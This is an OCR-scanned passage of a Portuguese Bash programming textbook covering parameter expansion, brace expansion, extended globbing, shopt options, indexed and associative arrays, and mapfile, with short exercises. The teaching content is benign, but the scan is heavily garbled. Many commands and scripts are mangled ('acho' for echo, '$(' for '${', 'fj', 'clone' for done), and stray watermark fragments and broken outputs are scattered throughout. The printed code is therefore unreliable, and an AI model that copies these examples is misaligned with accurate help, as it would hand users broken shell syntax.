$ e c ho $(dt* ) 
Ist o eh um test.e 
$ e cho S(at• t) 
o eh um teste 
$ oata~ ' date " +%d/ %m/%Y" ' 
$ echo $Data 
16/10/2002 
23. Esta construção não é válída em ambíentes Bourne Shell (sh). 
~1atcria com d r bs auto a.~s 
$ acho ${Data#*/} 
10/2002 
$ acho ${Data#*/*/} 
2002 
• 
${parâmetro##padrão-de-pesquisa}24 
Várias variáveis 
269 
Usando esse tipo de construção, o She/1 nos devolverá o conteúdo de 
parâmetro com o maior padrão-de-pesquisa possível removido à sua es-
querda. Caso parâmetro não contenha padrão-de-pesquisa, o retorno será 
igual ao parâmetro. 
Exemplos: 
$ echo $a 
Isto eh um teste 
$ echo $ { a##*t} 
e 
$ acho $Data 
16/10/2002 
$ acho ${Data##*/} 
2002 
$ echo ${Data#*/*/} 
2002 
• 
${parâmetro%padrão-de-pesquisaF5 
Usando esse tipo de construção, o She/1 nos devolverá o conteúdo de 
parâmetro com o menor padrão-de-pesquisa possivel removido à sua di-
reita. Caso parâmetro não contenha padrão-de-pesquisa, o retorno será 
igual ao parâmetro. 
Exemplos: 
$ acho ${a%ta*} 
Isto eh um tes 
$ echo ${a%ta*te*} 
Isto eh um 
$ echo $Data 
16/10/2002 
$ echo ${Data%/*/ *} 
16 
• 
${parâmetro%%padrão-de-pesquisaf6 
24. Esta construção não é válida em ambientes Boume Shell (sh). 
25. Esta construção também não é válida em ambientes Bourne Shell (sh). 
26. Esta construção também não é válida em ambientes Bourne Shell (sh). 
270 Programação Shell Linux 
Usando esse tipo de construção, o She/1 nos devolverá o conteúdo de 
parâmetro com o maior padrão-de-pesquisa possível removido à sua direi-
ta. Caso parâmetro não contenha padrão-de-pesquisa, o retorno será igual 
ao parâmetro. 
Exemplos: 
$ echo $(aU te•) 
Isto eh UlO 
$ echo $(an t • ) 
Is 
$ echo $Da t .a 
16/10/2002 
$ echo $(Data%~/ • ) 
16 
Os exemplos anteriores são didáticos (por serem semelhantes, mostra-
ram as diferenças de uso), porém pouco práticos. Vejamos agora um exem-
plo bastante prático: façamos um script para transformar todos os arquivos 
com extensão .html em .htm 
$ cat capa 1 
f ! /bin/bash 
j Rapidarnem;.e converte a.rquivos • . html em .., .htm 
8 lütera a.s extensões e mantendo o nome do arqu1vo 
for i iH " . html 
do 
clone 
if 
[ - f $(iH) 
then 
echo Sli· ll jah ex1ste 
e l sc 
mv $i 'ili'l l 
fj 
• 
${parâmetro/de/para}27 
Usando esse tipo de construção, o She/1 nos devolverá o conteúdo de 
parâmetro trocando a primeira cadeia de pela cadeia para. 
Você já viu que tem um efeito bastante semelhante ao do comando c.r 
atuando em uma variável, mas existem algumas diferenças: 
27. Esta construção só e valida no Bash 2. 
Mate 
com d re l s 
t • s 
Várias variáveis 
271 
Atua em uma cadeia e não em caracteres como o tr; 
-
Atua somente na primeira ocorrência da cadeia e não em todas como 
O tr; 
Por ser um intrínseco (em bom programês, buílt-ín) do She/1, sua exe-
cução é bem mais veloz que a do tr . 
Vamos ver logo um exemplo para isso se tornar mais claro: suponha que 
você tenha criado (ou provavelmente recebido do DOS/Windows) arqui-
vos com espaços em branco no nome. Baseado no exemplo anterior, para 
trocar os espaços em branco por um sublinha (_) , poderíamos fazer um 
scrípt assim: 
$ cat trocabranco 
~!/bin/bash 
W Tira espaços em branco do nome do arquivo 
for Arq in ·· • ' * 
do 
if [ - f "$(Arq/ !_) " 
then 
echo "${Arq/ !_) "' jah existe 
else 
mv "SArq" "${Arq/ I_) " 
Ji 
done 
Como você viu pelo cuidado que tivemos sempre protegendo os espa-
ços em branco da interpretação do She/1, realmente não é um bom negócio 
trabalhar com arquivos com nomes separados por brancos. 
Olha só o conteúdo do meu diretório: 
$ ls -l 
Arquivo 
Arquivo Pior Ainda 
Arquivo Ruim 
Vamos agora executar o nosso programa e ver o que sucedeu: 
$ trocabr anco 
$ ls -l 
Arquivo 
Arquivo_Pior Ainda 
Arouivo Ruim 
. 
-
272 Programação Shell Unux 
Repare que Arquivo Ruim foi renomeado para Arquivo_Ruim, mas o 
Arquivo Pior Ainda não ficou do jeito que queríamos. Isso se deve ao fato 
deste tipo de substituição de parâmetros atuar somente na primeira ocor-
rência da cadeia de. Para que possamos realizar o pretendido de forma 
limpa, veremos a substituição de parâmetros a seguir: 
• 
${parâmetro//de/para)28 
Esse caso é exatamente igual ao anterior, exceto pelo fato de que todas 
as ocorrências da cadeia de serão substituídas pela cadeia para . 
Vamos então alterar o nosso exemplo para ver se funciona mesmo: 
$ cat trocabranco 
~
! /bin/bash 
* Tira espaços em branco do nome do arquivo (versão 21 
for Arq in~' 
'
~ 
do 
if I - f "$(Arq// I I " 
then 
echo "S(Arq// /_) " jah existe 
else 
mv "$Arq" "${Arq// /_1 " 
fi 
done 
$ ls - 1 
Arquivo 
Arquivo Pior Ainda 
Arquivo Ruim 
$ trocabranco 
$ ls -1 
Arquivo 
Arquivo_Pior_Ainda 
Arquivo_ Ruim 
• 
${parâmetro/\} 
• 
${parâmetro,} 
28. Esta construção só é valida no Bash 2. 
Várias variáveis 
273 
Essas expansões foram introduzidas a partir do Bash 4.0 e modificam 
a caixa das letras do texto que está sendo expandido. Quando usamos 
circunflexo 
tA). a expansão é feita para maiúsculas e quando usamos 
vírgula L 1. a expansão é feita para minúsculas. 
Exemplo: 
$ Nome="botelho'' 
$ eoho $ (Nome'l 
Bot elho 
$ echo ${Nome""" ) 
BOTELHO 
$ Nome= "botel ho carvalho" 
$ echo ${Nome" } 
Bo telho carv a l ho 
Que pena ... 
Um fragmento de script que pode facilitar a sua vida: 
read - p "Deseja continuar (s/n)? " 
( ( $jREPLY') == N 11 &< exit 
Essa forma evita testarmos se a resposta dada foi um N (maiúsculo) ou 
um n (minúsculo). 
No Windows, além dos vírus e da instabilidade, também são frequentes 
nomes de arquivos com espaços em branco e quase todos em maiúsculas. 
No exemplo anterior, vimos como trocar os espaços em branco por subli-
nha u , no próximo veremos como passá-los para minúsculas: 
$ c a t t rocac ase. sh 
B!/bin/bash 
fi Se o nome do a rquivo tiver pelo menos urna 
i+ lecra mai úscula, t roca- a para minUscul a 
f ox Axq in ~ [A-Z J• 
do 
Pelo menos 1 minuscula 
i f [ - f "$(1\rq, , J" 
then 
Arq em minusculas jã existe? 
el :se 
clo n e 
echo ${Arq, , l já existe 
mv "$ A :r c;( 
"' $ (Arq_, , } " 
fi 
~1atcria com d r bs auto a.~s 
274 Programação Shell Linux 
Nos casos anteriores, para formar o padrão-de-pesquisa ou de 
e para, podem ser usados todos os metacaracteres (ou curin-
gas) reconhecidos pelo Shell, tais como: * , '? , r L r - 1 . 
Expansão de chaves { ... }• 
Apesar da semelhança na sintaxe. a expansão de chaves que veremos 
agora não tem mais nada que se pareça com a expansão de parâmetros 
que acabamos de ver. Portanto não tente fazer correlações, porque qual-
quer semelhança é mera semelhança mesmo. : } 
Expansão de chaves é um mecanismo similar à expansão de caracteres 
curingas, porém o que for gerado não tem nada a ver com arquivo. Elas são 
usadas para gerar cadeias arbitrárias, produzindo todas as combinações 
possíveis, levando em consideração os prefixos e sufixos. 
Existiam 5 sintaxes distintas, porém o Bash 4.0 incorporou uma sa Elas 
são escritas da seguinte forma: 
1. {lista}, onde lista são caoleias separadas por vírgulas; 
2. {inicio .. fim}; 
3. prefixo {****}, onde os asteriscos ( ****) podem ser substituídos 
por lista ou por um par inicio . . fim; 
4. { **** 1 sufixo, onde os asteriscos ( ****> podem ser substituídos 
por lista ou por um par inicio . . fim; 
5. prefixo { * * * * 1 sufixo, onde os asteriscos ( * * * *) podem ser subs-
tituídos por lista ou por um par in i cio .. fim; 
6. {inicio . . fim .. incr}, onde incr é o incremento (ou razão, ou 
passo). Esta foi introduzida a partir do Bash 4.0. 
O resultado da expansão de chaves não será classificado, virá na mes-
ma ordem em que foi gerado: da esquerda para a direita. 
Exemplo: 
$ echo (r 1p 1 g ) ato 
rato pato ga~o 
~1atcria com d r bs auto a.~s 
$ echo JUlio{Cezar,cesar ,C.}Neves 
JulioCezarNeves J1.1lioCesarNeves JulicC .Neves 
$ l s arq* 
Várias variáveis 
275 
Listagem genérica dos arquivos 
arqal. txt 
arqa 2 . txt 
arqa . txt 
a rqb. txt 
a.rqc. t:<t 
arquivo 
arquivo . t xt 
$ ls arq (a',b,c} .txt 
Listagem mais seletiva 
arqal. t :-:.t 
a rqa2 . t xt: 
a rqa . t xt 
arqb . txt:. 
a rqc . txt 
Uma expressão da forma l ;c . y 1 será expandida pela formação de uma 
sequência de x até y, não importando se x e y são números ou caracteres 
(desde somente um caractere) e desde que ambos sejam do mesmo tipo. 
Exemplo: 
$ echo (A .. Z) 
A 8 C D E F G H I J K L M N O P Q R S T U V W X Y Z 
$ echo ( 0 .. 9 ) 
o 1 2 3 4 s 6 1 a 9 
$ eoho (A .. O ) 
A B C O 
$ e oho {0 •. A} 
O C B A 
$ e c ho (Z .• a ) 
Z[ 
]
' 
·
~ 
$ echo (AA . . AZ ) 
(AA • • AZ) 
$ e c ho ( 18 . . 11 I 
18 17 16 15 1~ 1 3 12 11 
$ <>cho ( 1. . A) 
( 1. .A} 
$ echo (0 . . 1 5 . . 3) 
o 3 6 9 12 15 
$ o c ho {G .. A . . 2 ) 
G E C A 
$ e cho (000 .. 100 .. 10) 
000 0 10 020 030 0 40 050 060 070 080 090 100 
Sequencia decrescente 
Carac. entre Z (maiusc) e a (minusc} 
So 1 caraciere ou não funciona 
Quando é número, funciona 
Letra e número nAo funfa 
Incremento de 3, só no Bash 4 
lncr de 2 decresc, só no Bash 4 
Zeros á esquerda, só no Bash 4 
O grande uso desse recurso é para abreviar o seu trabalho. Vejamos 
como escrever menos quando você tem uma sequência longa e repetida 
de caracteres. 
Exemplo: 
~1atcria com d r bs auto a.~s 
276 Programação Shell Linux 
$ mkdir /usr/local/src/bash/{old,new,dist,bugs} 
$ chown root /usr/{ucb/(ex,edit} ,lib/(ex?.? , how_ex}} 
$ eval \>(a .. c}.{ok ,err}\ ; 
$ ls ?. * 
a .err a . ok b .err b .o k c .err c . ok 
Veja o evaf no ao capitulo 
A sintaxe desse último exemplo pode parecer rebuscada, mas substitua 
o eval por echo e verá que aparece: 
$ echo \>{a .. c}. {ok, err}\ ; 
>a .o k; >a .err; >b . ok; >b .err ; >c .ok; >c .err; 
Ou seja, o comando para o Bash criar os 6 arquivos. A função do eval é 
executar este comando que foi montado. 
O mesmo pode ser feito da seguinte maneira: 
S touch (a .. z} . (ok, err} 
Mas no primeiro caso, usamos Bash puro, o que torna essa forma pelo 
menos cem vezes mais rápida que a segunda que usa um comando exter-
no (touch) . 
Ganhando o jogo com mais curingas 
Isto aqui parece um pouco com a expansão de chaves que acabamos de 
ver e às vezes podemos usar esta forma ou a anterior. 
O She/1 possui, além do globbing normal (a expansão •, ? e [a-zJ de 
nomes de arquivos e diretórios), ou seja, os curingas conhecidos por todos e 
um globbing estendido. Este globbing estendido, em alguns casos, poderá ser 
muito útil e sempre será mais veloz que o pipe e grep que ele substituirá. 
Nas linhas a seguir, lista_deyadroes , são um ou mais padrões sepa-
rados por uma barra vertical ( 1 > . Veja: 
?(lista_de_padroes} 
Casa zero ou uma ocorrência de lista_de_padroes 
* (lista_de_padroes) 
Casa zero ou mais ocorrências de lista_deyadroes 
+(lista_de_padroes} 
Várias variáveis 
277 
Casa uma ou mais ocorrências de list a_d;,_padroes 
@ {1 ist:a_de _pad roes ) 
Casa com exatamente uma ocorrência de lista_de_padroes 
Casa com qualquer coisa, exceto com hs~:a_cle_padroes 
Para poder utilizá-los precisa executar o shopc conforme o exemplo a 
seguir: 
S shopt - s oxtglob 
$ ls file* 
file fi l ename 
.f1lenamename 
fi leutil s 
$ ls file?(name) 
file filename 
$ ls file* (name) 
fil e tilename Iilenamename 
$ ls file+(name) 
filename fil enamename 
S ls f ile@ (narne) 
!ilenarr,e 
$ ls fü e• (narne) 
file fiJ.enamename ftleutl.ls 
$ 1& f i le+(narne tu t i ls) 
filenamt- :ilenamename !ileut1ls 
$ ls fi l e 0 (narnel utils) 
filename fileut.ils 
Obrigado Tiago Peczenyj 
Divertido esse 
O mesmo que /s file{name,ut#s} 
O Tiago me deu as dicas acima, mas existem outras ... Teste as opcoes a 
seguir dentro do comando shopt -s <opcoes>. 
cdspell 
Com essa opção setada, pequenos erros de digitação no nome do diretório 
para o qual você deseja fazer um cct serão ignorados, isto é, caracteres 
extras ou esquecidos serão automaticamente corrigidos sem necessidade 
de redigitação. 
Mate 
com d re l s 
1 • s 
278 Programação Shell Unux 
No exemplo a seguir, queria fazer um cd rede, que é um diretório abaixo 
do meu home. 
$ cd red 
bash: cd : red : Arquivo ou diretório 1nexistente 
$ shopt -a cdspell 
$ cd red 
rede 
$ cd -
/home/jneves 
$ cd ede 
rede 
$ cd -
/home/jneves 
$ cd redes 
rede 
Já viu que essa é uma boa opção para você ter no seu .bashrc, não é? 
cmdhist 
Essa opção é bacana, pois transforma comandos criados em diversas li-
nhas (como um for ou um while, por exemplo) em uma única linha, com 
os comandos separados por ponto e vírgula <; >. Isso é particularmente 
útil para editar comandos e portanto é uma opção selada por default pelo 
Bash. 
dotglob 
Essa opção permite que nomes de arquivos começados por um ponto <.), 
conhecidos como "arquivos escondidos", sejam expandidos com os meta-
caracteres curinga. 
$ ls •bash• 
ls : 1mposaivel acessar •bash·: Arqu1vo ou diretório inexistente 
$ shopt -• dotglob 
$ la •baah• 
.bash_hlstory .bash_loqout .bashrc 
Várias variáveis 
279 
Vetores ou Arrays 
Um vetor ou array é um método para se tratar diversas informações (normal-
mente do mesmo tipo) sob um único nome, que é o nome do vetor. Podería-
mos ter por exemplo um vetor chamado cervejas, que armazenasse Skol, An-
tártica, Polar, ... Para acessarmos esses dados, precisamos de um índice. 
Assim, NomeDoVet o r ( Indi ce) contém um val o r, ou seja cer vejas [O] 
contém Skol e cerveJa[2 J contém Polar. 
Existem 4 formas de se declarar um vetor: 
vet 5 (elo eu, .. . elnl 
Cria o vetor vet, inicializando-o com os elementos 
ell, e l 2, ... , elnl . Se for usado como vet= () , o 
vetor vct será inicializado vazio. Se vat já existir, 
perderá os antigos valores e receberá os novos, 
ou será esvaziado; 
vet ln J=val 
Cria o elemento índice n do vetor vet com o valor 
cl~cla.tê - a vêt 
declare -A V€' 1:. 
va l. Se não existir, o vetor vet será criado; 
Cria o vetor vet. vazio. Caso vet já exista, se man-
terá inalterado; 
Cria um vetor associativo (aquele cujos índices 
não são numéricos). Essa é a única forma de de-
clarar um vetor associativo, que só é suportado a 
partir da versão 4.0 do Bash. 
Para se verificar o conteúdo de um elemento de um vetor, devemos usar 
a notação S{ve>: [nnJ 1. 
Os elementos de um vetor não precisam ser contínuos. Veja: 
S F~ lia [ lO ] •Silvina 
~ Familia[22]=Juliana 
S Familia(40]• Paula 
$ Familia(Sl] =Julio 
S echo $ (Familia( l OJ J 
Ju l iana 
S echo S(Famil ia(l8} ) 
S e c ho $ (Familia(40] ] 
Paula 
Mate 
com d re l s 
1 • s 
280 Programação Shell Linux 
Como você pode observar, foi criado um vetor com índices esparsos 
e quando se pretendeu listar um inexistente, simplesmente o retomo foi 
nulo. 
O Bash suporta a notação vet• (val1 val2 ... val 0 l para 
definir os valores dos n primeiros elementos do vetor vet 
Vamos criar outro vetor, usando a notação sintática do Bash: 
$ Frutas=(abacaxi banana laranja tangerina) 
$ echo $(Frutas (l)) 
bandna 
Êpa! Por esse último exemplo pudemos notar que a indexação de um 
vetor começa em zero e não em um, isto é, para listar abacaxi deveríamos 
ter feito: 
$ ocho ~~ F~utas( OJJ 
abacaxi 
Mas como dá para perceber, dessa forma só conseguiremos gerar ve-
tores densos, mas usando a mesma notação, ainda somente sob o Bash, 
poderíamos gerar vetores esparsos da seguinte forma: 
$ Veiculos=((2]=jegue [S]=cavalo [9]=patinete) 
Cuidado ao usar essa notação! Caso esse vetor já possuísse 
outros elementos definidos., os valores e os índices antigos se-
..... 
riam perdidos e após a atribuição só restariam os elementos 
M·hj:t:l·ttl recém-criados. 
Como vimos no capítulo 6 (sem exemplificar), a opção - a do co-
mando read lê direto para dentro de um vetor. Vejamos como isso 
funciona: 
S réad -a Ani-mttis <<< "cachorro gato cavalo'' 
Usando Here Strings 
~1atcria com d r bs auto a.~s 
Vamos ver se isso funcionou: 
$ for i in O 1 2 
> do 
> 
eoho ${Ani mais[$i) ) 
> done 
cachor ro 
ga to 
caval o 
Várias variáveis 
281 
Ou, ainda, montando vetores a partir da leitura de arquivos: 
$ cat nums 
1 2 3 
2 4 6 
3 6 9 
4 8 12 
s 10 15 
$ while read - a vet 
> do 
> 
echo -e ${vet[O]):${vet[l] }:$[vet[2} } 
> done < nums 
1 : 2:3 
2 : 4:6 
3 : 6: 9 
'I: 8 : 12 
5 : 10 : 15 
Vamos voltar às frutas e acrescentar ao vetor a fruta do conde e a 
f r uta pão : 
$ Fruta.s[4)="fruttt do condo" 
$ Fruta.s[5] •
11fruta pio" 
Para listar essas duas inclusões que acabamos de fazer em Fr utas, 
repare que usarei expressões aritméticas sem problema algum: 
$acho $ (Frutas[10- 6 ) ) 
frut.a do conde 
$ echo $(Frutas[l0/2) ) 
frut:a pão 
$ echo $(Frutas[2•2)) 
fruta do conde 
$ echo $(Frut as[0•3)) 
abacaY. i 
~1atcria com d r bs auto a.~s 
282 Programação Shell Linux 
Um pouco de manipulação de vetores 
De forma idêntica ao que vimos em passagem de parâmetros, o asterisco 
(• I e a arroba ( @J servem para listar todos. Dessa forma, para listar todos 
os elementos de um vetor podemos fazer: 
$ echo $(Frutas (*)} 
abacaxi batlana. laranja taügérina trut a do conde fruta pào 
ou: 
S ocho $(Frutas{@) ) 
abac~xi banana laranja tangerina ftuta do çonde fLuta pão 
E qual será a diferença entre as duas formas de uso? Bem, como pou-
cos exemplos valem mais que muito blá-blá-blá, vamos listar todas as fru-
tas. uma em cada linha: 
S for fruta in $ (Frutas [• ]) 
> do 
> 
echo $fruta 
> dono 
abac~"' xi 
banana 
l a-tanja 
tangerina 
fru~a 
do 
conde 
fru::a 
pão 
Ops, não era isso que eu queria! Repare que a fruta do conde e a 
truta pão ficaram quebradas. Vamos tentar usando arroba (@l : 
S for fruta in $ (Frutas[@} } 
> do 
> 
echo $fruta 
> done 
abacaxi 
banana 
laranjA 
tange.J:ina 
frutd 
do 
conde 
f ruta 
pão 
Mate 
com d re l s 
l • s 
Várias variáveis 
283 
Hiii, deu a mesma resposta! Ahh, já sei! O Bash está vendo o espaço em 
branco entre as palavras de fruta do conde e fruta pão como um separador 
de campos (veja o que foi dito anteriormente sobre a variável srFs) e parte 
as frutas em pedaços. Como já sabemos, devemos usar aspas para proteger 
essas frutas da curiosidade do She/1. Então vamos tentar novamente: 
$for fruta in "${Frutas[*]") 
> do 
> 
echo $fruta 
> done 
abacaxi banana laranja tangerina fruta do conde fruta p~o 
Epa, piorou! Então vamos continuar tentando: 
$ for fruta in "${Frutas[@]) " 
> do 
> 
echo $fruta 
> done 
abacaxi 
banana 
laranja 
tangerina 
fruta do conde 
fruta pão 
Voi/à! Agora funcionou! Então é isso, quando usamos a arroba <@ 1 , ela 
não parte o elemento do vetor em listagens como a que fizemos. Isto tam-
bém é válido quando estamos falando de passagem de parâmetro e da 
substituição de S@ . 
Existe uma outra forma de fazer o mesmo. Para mostrá-la vamos montar 
um vetor esparso, formado por animais de nomes compostos: 
$ Animais=( [2]="Mico Leão" [S]="Galinha d'Angola" [S]="Gato Pardo") 
Agora veja como podemos listar os índices: 
$ echo ${!Animais[*] ) 
2 5 8 
$ echo ${'Animais[@]) 
2 5 8 
284 Programação Shell Linux 
Essas construções listam os índices do vetor, sem diferença alguma na 
resposta. Assim sendo, podemos escolher uma delas para mostrar também 
todos os elementos de Animais. da seguinte forma: 
$ for Ind in ${!Animais[@) ) 
> do 
> echo S [Animais[Ind)) 
> done 
t.fico Leão 
Galinha d 'lU1qola 
Gato Pardo 
lnd recebe cada um dos lndices 
Para obtermos a quantidade de elementos de um vetor, ainda semelhan-
temente à passagem de parâmetros, fazemos: 
$ echo $[ NFrutas [* J) 
ou 
$ echo $ (#Frut a s [ 8 JI 
6 
Repare, no entanto, que esse tipo de construção lhe devolve a quantida-
de de elementos de um vetor, e não o seu maior índice. Veja este exemplo 
com o array veicul es, que, como vimos nos exemplos anteriores, tem o 
índice !9! em seu último elemento: 
S echo $ [ #Veiculos[*J ) 
3 
$ ec ho ${#Veic u.l os[8 ]) 
3 
Por outro lado, se especificarmos o índice, essa expressão devolverá a 
quantidade de caracteres do elemento daquele índice. 
S acho S{Frutas [l)) 
banana 
$ echo S {#Frutas[l } ) 
6 
Mate 
com d re l s 
1 • s 
Várias variáveis 
285 
Vamos entender como se copia um vetor inteiro para outro. A esta altura 
dos acontecimentos, já sabemos que como existem elementos do vetor 
rrutoas compostos por várias palavras separadas por espaços em branco, 
devemos nos referir a todos os elementos indexando com arroba f@J. Va-
mos então ver como copiar: 
$ array=
11 ${Frutas[@] )" 
$ echo "${array(4J }" 
$ echo "$ar:r:ay " 
abacaxi banana laranja tangeri na f tut:a do conde fruta pc\o 
O que aconteceu nesse caso foi que eu criei uma variável chamada 
$array com o conteúdo de todos os elementos do vetor Frutas . Como sob 
o Bash eu posso criar um vetor colocando os valores de seus elementos 
entre parênteses, deveria então ter feito: 
$ a r ray= ("S{Frutas[ @) )") 
$ echo "${array[ 4)} " 
frut.a do conde 
$ echo "${a.rray[S ) }" 
fcuta pão 
Como vimos no Capitulo 2, no fim da seção sobre o comando expr, a 
substituição de processos que usa dois pontos r : 1 serve para especificar 
uma zona de corte em uma variável. Relembrando: 
$ var-0123456799 
$ echo $(var:l:3) 
123 
$ echo $[var:3} 
3456789 
Em vetores, o seu comportamento é similar, porém agem sobre os seus 
elementos e não sobre seus caracteres como em variáveis, vide o exemplo 
anterior. Vamos exemplificar para entender: 
$ eoho $[Frutas[@ ):l:3} 
banana l aranjA t a n9erin4 
$ echo ${Frutas(@ ] :4 } 
fruta do conde f ruta pAo 
~1atcria com d r bs auto a.~s 
286 Programação Shell Unux 
Se fosse especificado um elemento, este seria visto como uma variável. 
$ echo ${Frutas[O] :1:4) 
baca 
Experimente agora para ver o que acontece na prática o que vimos na 
seção "Construção com Parâmetros e Variáveis", porém adaptando as 
construções ao uso de vetores. Garanto que você entenderá tudo muito fa-
cilmente devido à semelhança entre tratamento de vetores e de variáveis. 
Primeiro vou te dar um exemplo do que acabei de falar, depois você 
inventa uns scripts para testar outras Expansões de Parâmetros como as 
provocadas por %, u , t , H, ... , ok? 
Então vamos criar o vetor Frase: 
$ Frase={Alshançar o shéu é sensashional. Um sushesso\!) 
$ echo ${Frase[*)//sh/c) 
Alcançar o céu é sensacional . Um sucesso! 
Para coroar isso tudo, no dia 01/01 /201 O, após o primeiro reveillon da 
nova década, estava finalizando o texto para a sa edição deste livro quando 
surgiu na lista shell-script do Yahoo (não deixe de se inscrever porque ela é 
ótima e lá se aprende muuuuito) um colega perguntando como ele poderia 
contar a quantidade de cada anilha que teria de usar para fazer uma cabe-
ação. 
Anilha são aqueles pequenos anéis numerados que você vê nos cabos 
de rede, que servem para identificá-los. Em outras palavras, o problema 
era dizer quantas vezes ele iria usar cada algarismo em um dado intervalo. 
Vejamos a proposta de solução: 
$ cat anilhas.sh 
Tudo•S(eval echo {$1 .. $2)) 
for ( (i=O ; i<S{iTudo) ; i++)) 
( 
[ S!Tudo: i : l} 1 I I continue 
let Algarismo[S(Tudo :i : l}]++ 
for ( (i•O ; i<a9; i++)) 
printf "Algarismo %d = %2d\n" \ 
Re<:ebe os nvm. entre $1 e S2 
Espaço entre 2 números 
lncrementa vetor do algarismo 
Várias variáveis 
287 
Si S!Alga r ismo[Si} :-01 
Se o elemento for valia, Nsta zero 
$ . I anilhas . sh 12 15 
Algari smo o • o 
Algari smo 1 = 4 
Algari smo 2 
1 
Al gari smo 3 . 1 
;,.l garismo ~ 
1 
Al gari smo 5 • 1 
Algarismo 6 
o 
Algari smo 1 = o 
Algarismo 8 
o 
Alg~1 ri smo 9 = o 
Me divirto muito escrevendo um script como esse, no qual foi empregado 
somente Bash puro. Além de divertido, é antes de mais nada rápido. 
Vetores associativos 
A partir do Bash 4.0, passou a existir o vetor associativo. Chama-se ve-
tor associativo, aqueles cujos índices são alfabéticos. As regras que valem 
para os vetores inteiros, valem também para os associativos, porém antes 
de valorar estes últimos, é obrigatório declará-los. 
Exemplo: 
$ docl ~ro -A AnimAis 
Obrigatório para vetor associativo 
$ Animais [ cavalo ] ~doméstico 
$ Animai s (=ebr a ]asel vagem 
$ AnLmais [gato] =doméstico 
$ Animais (tiqre] • sel vagem 
É impossível gerar todos os elementos de uma só vez, como nos 
vetores inteiros. Assim senalo, não funciona a sintaxe: 
Animais= ( (cavalol =domêstico [zebral=selvagem \ 
(gato]=doméstíco [tigre ] =selvageml 
$ echo $(Animai s (@ ]) 
domê$~ico selvagem domésti co selvagem 
$ oc ho $ ( !Animais [ @]] 
gato z ebra cavalo tigre 
~1atcria com d r bs auto a.~s 
288 Programação Shell Unux 
Repare que os valores não são ordenados, ficam armazenados na or-
dem que são criados, diferentemente dos vetores inteiros que ficam em 
ordem numérica. 
Supondo que esse vetor tivesse centenas de elementos, para listar separa-
damente os domésticos dos selvagens, poderíamos fazer um script assim: 
$ cat animal.sh 
i !/bin/bash 
f Separa animais selvagens e domésticos 
declare -A Animais 
Animais(cavalo]=doméstico 
Animais(zebra]=selvagem 
Animais (gato}=domés~ico 
Animais (tigre]=selvagem 
Animais (urso pardo)=selvagem 
for Animal in "${ !Animais(@) )" 
do 
done 
if [( "$[Animais[SAnimal)l " ==selvagem)] 
then 
Sel= ( "S { Sel (@) ) " "$Animal") 
else 
Dom=("S(Dom[@]) " "SAnimal ") 
fi 
Criando vetor para teste 
Criando vetor para teste 
Criando vetor para teste 
Criando vetor para teste 
Criando vetor para teste 
Percoffendo vetor pelo índice 
Gerando vetor p/ selvagens 
Gerando vetor p/ domésticos 
~ 
Operador condicional , usado para descobrir qual 
i+ vetor cem mais elementos . Veja detalhes na seçâo 
#+ O interpretador aritmético do Shell 
Maior=$ (${ iDom[@)]>S{#Sel(@]]?$(~Dom[@]]
: $(1Sel[@]]J 
clear 
tput bold: pnntf "%- 1Ss.- 15s\n" Domésticos Selvagens; tput sgrO 
for ( (i=O ; i<SMaior ; i++)) 
tput cup $(1+i] 0 : echo ${Dom{i]l 
tput cup $(1+1) 14; echo S(Sel[i]) 
Gostaria de chamar a sua atençào para um detalhe: neste script me referi 
a um elemento de vetor associativo empregando s 1 Animais 1 SAnimal 1 1 ao 
passo que me referi a um elemento de um vetor inteiro usando s {Se! lil 1. 
Ou seja, quando usamos uma variável como índice de um vetor inteiro, não 
precisamos prefixá-la com um cifrão <S> , ao passo que no vetor associati-
vo, o cifrão <S l é obrigatório. 
Várias variáveis 
289 
lendo um arquivo para um vetor 
Ainda falando do Bash 4.0, eis que ele surge com uma outra novidade: 
o comando intrínseco (builtin) mapril t' , cuja finalidade é jogar um arqui-
vo de texto inteiro para dentro de um vetor, sem loop ou substituição de 
comando 
-
EPA! Isso deve ser muito rápido! 
-
E é. Faça os testes e comprove! 
Exemplo: 
$ cat frutas 
a.betc ~tte 
mça ç.ã 
moranqo 
pera 
t.~nçre.rina 
uva 
S mapfilo vot < frueas 
$ echo $(vet[@) } 
abac a ~e roaçd mo t:ango pera tanqer1na uvd 
Mandando lrotiJS para vetor vet 
Listando todos elementos de vet 
Obteríamos resultado idêntico se fizéssemos: 
$ vet• ($(cat frutas)) 
Porém, isso seria mais lento, porque a substituição de comando é exe-
cutada em um subshell. 
Uma outra forma de fazer isso que logo vem à cabeça é ler o arquivo 
com a opção - a do comando react. Vamos ver como seria o comporta-
mento disso: 
S read - a vet < frutas 
$ echo $ ( vet [@)} 
abacat.e 
Como deu para perceber, foi lido somente o primeiro registro de t rutas . 
Mate 
com d re l s 
1 • s 
290 Programação Shell Linux 
Exercícios 
1. Escreva um programa chamado meurm que recebe como argumen-
to os nomes dos arquivos a serem removidos. Se a variável global 
MAXFILES estiver valorada, então tome este valor como o número 
máximo de arquivos a remover sem perguntas. Se a variável não 
existir ou estiver com valor nulo, use 10 como o máximo. Se o número 
de arquivos a ser removido exceder MAXFILES, solicite ao operador 
a confirmação antes de removê-los. A seguir o resultado esperado: 
$ ls I wc -1 
25 
$ meurm * 
Removo 25 Arquivos? (s/n) n 
Os A.t:quivos nao foram removidos 
$ MAXFLLES=lOO 
$ méurm • 
$ ls 
$ 
2. Faça dois programas: 
a} Um menu para escolher: 
1. Inclusão em ArqOLs 
2. Exclusão de ArqOLs 
3. Alteração em ArqOLs 
A opção escolhida será passada para o segundo programa. 
b} Este programa lê os dados necessários à opção escolhida no progra-
ma anterior, formata um registro e devolve-o formatado (no mesmo 
formato de ArqOis} para o primeiro programa. 
O primeiro programa recebe o registro formatado do segundo, exi-
be-o na tela, solicitando confirmação, e procede ou não a esta inclu-
são, exclusão ou alteração. 
- ~ -
~1atcria com d r bs auto a.~s 
·capítulo 8 
Sacos de gatos 
Neste capítulo, veremos comandos que, por uma razão ou 
por outra, não se encaixam em nada que vimos até ago-
ra. Não existe também nada de particular na sequência de 
apresentação dos tópicos. Ou seja: É O FINAL, PESSOAL. 
A primeira faz tchan, a segunda faz 
tchun, e tchan, tchan, tchan ... 
Esta seção descreverá um comando bastante diferente 
do que estamos acostumados em She/1: eval . Seu forma-
to é o seguinte: 
eval <li nha-de-comando> 
Onde <linha-de-comando> é uma linha de comando 
comum, que você poderia executar teclando direto no ter-
minal. Quando você põe eval na sua frente, no entanto, o 
efeito resultante é qu:e o She/1 resolve a linha de comandos 
antes de executá-la29• Para um caso simples, realmente 
não tem efeito: 
29. O que acontece é que o e vai simplesmente executa a linha de comandos 
